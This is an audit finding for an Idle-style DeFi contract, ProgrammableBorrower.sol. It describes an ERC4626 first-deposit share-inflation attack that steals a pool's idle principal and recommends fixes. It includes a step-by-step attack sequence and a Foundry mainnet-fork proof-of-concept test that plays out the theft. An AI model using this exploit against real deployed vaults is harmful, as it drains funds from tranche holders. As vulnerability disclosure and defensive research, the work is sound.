### Title
Unchecked ERC4626 first-deposit share inflation steals the programmable borrower's idle principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary
`ProgrammableBorrower` accepts an arbitrary asset-compatible ERC4626 vault and deposits all idle pool funds through `_depositToVault`, but it ignores the returned share amount. [1](#0-0) [2](#0-1) [3](#0-2) 

When the configured vault is empty or has a very small supply, an unprivileged vault user can seed it with one share and donate enough underlying to inflate the share price so that `vault.deposit()` mints zero or dust shares for `ProgrammableBorrower`. The attacker can then redeem their share for both the donation and the pool's deposited principal, while the borrower records a vault loss because its share balance remains economically worthless. [4](#0-3) 

### Finding Description
`initialize` validates only that the vault asset matches the IdleCDO token; it does not require the vault to already hold safe liquidity, use virtual shares/assets, or have a minimum total supply. [1](#0-0) 

During `onStartEpoch`, the contract snapshots the pre-deposit value as `epochStartVaultAssets`, then calls `_depositToVault` with its entire on-hand underlying balance and `_principalAssets == 0`. [5](#0-4) 

`_depositToVault` transfers the full deposit to the external vault but never validates `shares`, checks that the minted shares convert back to approximately `_assetAmount`, or applies a minimum-share bound. [3](#0-2) 

The concrete sequence is:

1. The pool is stopped, so `ProgrammableBorrower` holds `P` underlying and owns no shares in the selected vault, or the honest manager configures a new empty vault while `epochAccountingActive` is false and the old vault balance is zero. [6](#0-5) 
2. The attacker deposits `1` unit of underlying into the empty vault and receives the first share.
3. The attacker directly transfers approximately `P` underlying to the vault, inflating its `totalAssets` while total supply remains one share.
4. The honest manager later calls `IdleCDOEpochVariant.startEpoch`, which reaches the programmable-borrower start hook. [7](#0-6) 
5. `onStartEpoch` sweeps the `P` idle underlying into the inflated vault. With an ordinary raw-balance ERC4626 formula, the pool receives `floor(P * 1 / (P + 1)) = 0` shares.
6. The attacker redeems the only share and receives approximately `1 + P + P`, recovering the donation and stealing the pool's `P` deposit.

The vault accounting then sees `earnedAssets == 0` while `principalAssets == epochStartVaultAssets`, producing a loss instead of preserving principal. [4](#0-3) 

### Impact Explanation
The attacker steals the entire first idle deposit `P`, less the one-unit seed share and any redemption or flash-loan costs. The loss is not merely an accounting artifact: the underlying is redeemable by the attacker from the vault, while `ProgrammableBorrower` owns zero or dust shares. At the next stop, `_vaultNetInterest` reports the missing `P` as a loss and `totalInterestDueNow` clamps the resulting negative net delta to zero. [8](#0-7) 

This breaks the solvency and fair-loss-waterfall invariants: an external vault user forces an immediate principal loss that is ultimately borne by active AA/BB tranche holders rather than by the attacker. No borrower action, malicious owner, malicious manager, stale oracle, or privileged collusion is needed. The attack is strongest on the first vault deposit or after the honest manager switches to a new vault because `setVault` requires the old share balance to be zero but does not seed the new vault atomically. [6](#0-5) 

### Likelihood Explanation
Likelihood is conditional rather than universal: the configured ERC4626 vault must be empty or sufficiently shallow, and its `totalAssets` must be influenceable by direct underlying donations. Those conditions occur naturally for a newly configured vault and are explicitly within the supported threat model because any ERC4626 vault user may deposit or send tokens. `ProgrammableBorrower` currently has no defense if `deposit` returns zero shares. [1](#0-0) [3](#0-2) 

For a vault with substantial pre-existing supply, the required donation becomes economically larger, so exploitability depends on the selected vault's liquidity and inflation protection. The finding is still a direct-loss issue whenever a compatible empty or newly deployed vault is configured.

### Recommendation
Do not treat ERC4626 deposits as successful solely because the call returns. In `_depositToVault`, require `shares != 0` and verify that `vault.convertToAssets(shares)` is within a tightly bounded rounding tolerance of `_assetAmount`; otherwise revert the deposit. Additionally, only configure vaults that implement inflation-resistant share accounting, such as a non-zero decimals offset or virtual assets/shares, or atomically seed a minimum vault position during initialization or `setVault`. [9](#0-8) 

### Proof of Concept
The following fork test targets a configured raw-balance ERC4626 vault whose supply is empty before the first programmable-borrower sweep. It uses a test vault address supplied through `VAULT`, the deployed `ProgrammableBorrower` through `PROGRAMMABLE_BORROWER`, its `IdleCDOEpochVariant` through `IDLE_CDO`, and an honest `CDO_OPERATOR` account authorized to call `startEpoch`.

```solidity
// test/foundry/ProgrammableBorrowerShareInflation.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";
import {IERC4626} from "contracts/interfaces/IERC4626.sol";
import {ProgrammableBorrower} from "contracts/strategies/idle/ProgrammableBorrower.sol";
import {IdleCDOEpochVariant} from "contracts/IdleCDOEpochVariant.sol";

contract ProgrammableBorrowerShareInflationTest is Test {
    function testFirstDepositInflationStealsIdlePrincipal() external {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"));

        ProgrammableBorrower borrower =
            ProgrammableBorrower(vm.envAddress("PROGRAMMABLE_BORROWER"));
        IdleCDOEpochVariant cdo =
            IdleCDOEpochVariant(vm.envAddress("IDLE_CDO"));
        IERC4626 vault = IERC4626(address(borrower.vault()));
        IERC20Detailed asset = IERC20Detailed(address(borrower.underlyingToken()));
        address operator = vm.envAddress("CDO_OPERATOR");
        address attacker = makeAddr("erc4626-attacker");

        // Preconditions: a low-supply raw-balance ERC4626 and idle pool cash.
        uint256 idlePrincipal = asset.balanceOf(address(borrower));
        assertGt(idlePrincipal, 0);
        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(vault.totalSupply(), 0);

        // Make the next buffer-period start legal without changing accounting.
        vm.warp(cdo.epochEndDate() + cdo.bufferPeriod());

        // Attacker creates the first share and inflates totalAssets by donating
        // enough that ProgrammableBorrower's P-asset deposit mints zero shares.
        uint256 donation = idlePrincipal;
        deal(address(asset), attacker, 1 + donation);

        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        uint256 attackerShares = vault.deposit(1, attacker);
        asset.transfer(address(vault), donation);
        vm.stopPrank();

        assertEq(attackerShares, 1);

        // Honest epoch sequencing performs the vulnerable idle-cash sweep.
        vm.prank(operator);
        cdo.startEpoch();

        // Standard raw-balance share math mints zero shares:
        // shares = idlePrincipal * 1 / (1 + donation).
        assertEq(vault.balanceOf(address(borrower)), 0);

        // The sole share now controls donation + seed + stolen pool deposit.
        uint256 balanceBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(attackerShares, attacker, attacker);

        assertGt(
            asset.balanceOf(attacker) - balanceBefore,
            donation,
            "attacker recovered donation plus stolen pool principal"
        );
        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(borrower.vaultLoss(), idlePrincipal);
    }
}
```

For a pre-existing vault with supply `S` and assets `A`, the same test generalizes by donating enough assets to make `idlePrincipal * S / (A + donation)` below one share or below the pool's acceptable rounding bound.
